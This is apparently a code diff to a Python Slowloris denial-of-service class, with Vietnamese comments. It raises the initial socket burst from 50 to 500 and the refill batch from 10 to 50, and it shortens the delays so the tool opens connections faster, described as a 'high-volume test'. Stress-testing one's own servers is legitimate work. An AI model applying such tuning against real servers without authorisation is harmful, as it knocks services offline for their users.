@@ -142,12 +142,12 @@ class SlowlorisAttack:
                 current = len(self._sockets)
 
             if current < self.num_sockets:
-                to_create = min(10, self.num_sockets - current)
+                to_create = min(50, self.num_sockets - current)  # refill 50 cùng lúc
                 for _ in range(to_create):
                     if self._stop.is_set():
                         break
                     self._create_socket()
-                    time.sleep(0.05)
+                    time.sleep(0.01)  # 10ms → 100 sockets/s khi refill
             else:
                 time.sleep(0.5)
 
@@ -166,11 +166,11 @@ class SlowlorisAttack:
 
         logger.info(f"Slowloris → {self.host}:{self.port}, sockets={self.num_sockets}")
 
-        # Phase 1: Mở socket ban đầu
+        # Phase 1: Mở socket ban đầu — batch lớn hơn cho high-volume test
         logger.info(f"Mở {self.num_sockets} socket ban đầu...")
-        for i in range(min(self.num_sockets, 50)):
+        for i in range(min(self.num_sockets, 500)):
             self._create_socket()
-            time.sleep(0.02)
+            time.sleep(0.005)  # 5ms delay → ~200 sockets/s
 
         # Phase 2: Chạy background threads
         threads = [
